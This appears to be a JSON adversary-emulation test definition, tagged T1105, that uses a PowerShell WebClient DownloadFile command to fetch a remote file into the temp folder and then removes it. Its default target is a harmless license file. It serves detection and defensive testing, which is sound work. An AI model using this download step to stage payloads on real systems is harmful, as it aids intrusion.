{
  "id": "42dc4460-9aa6-45d3-b1a6-3955d34e1fe8",
  "name": "Windows - PowerShell Download",
  "description": "This test uses PowerShell to download a payload.\nThis technique is used by multiple adversaries and malware families.\n",
  "platforms": [
    "windows"
  ],
  "steps": [
    {
      "id": "dca197e1-7792-4a40-bb82-6eb0e55a01a5",
      "type": "execute-command",
      "data": {
        "command": "(New-Object System.Net.WebClient).DownloadFile(\"#{remote_file}\", \"#{destination_path}\")\n",
        "command_type": "powershell"
      },
      "elevation_required": false
    },
    {
      "id": "26a95f3f-ff53-4094-8419-88df7ac55d3d",
      "type": "execute-command",
      "data": {
        "command": "Remove-Item #{destination_path} -Force -ErrorAction Ignore\n",
        "command_type": "powershell"
      },
      "elevation_required": false
    }
  ],
  "flows": [
    {
      "s": "dca197e1-7792-4a40-bb82-6eb0e55a01a5",
      "p": "on-success",
      "o": "26a95f3f-ff53-4094-8419-88df7ac55d3d"
    },
    {
      "s": "dca197e1-7792-4a40-bb82-6eb0e55a01a5",
      "p": "on-failure",
      "o": "26a95f3f-ff53-4094-8419-88df7ac55d3d"
    }
  ],
  "tags": [
    "T1105"
  ],
  "input_arguments": [
    {
      "name": "remote_file",
      "type": "url",
      "description": "URL of file to copy",
      "value": "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt"
    },
    {
      "name": "destination_path",
      "type": "path",
      "description": "Destination path to file",
      "value": "$env:TEMP\\Atomic-license.txt"
    }
  ]
}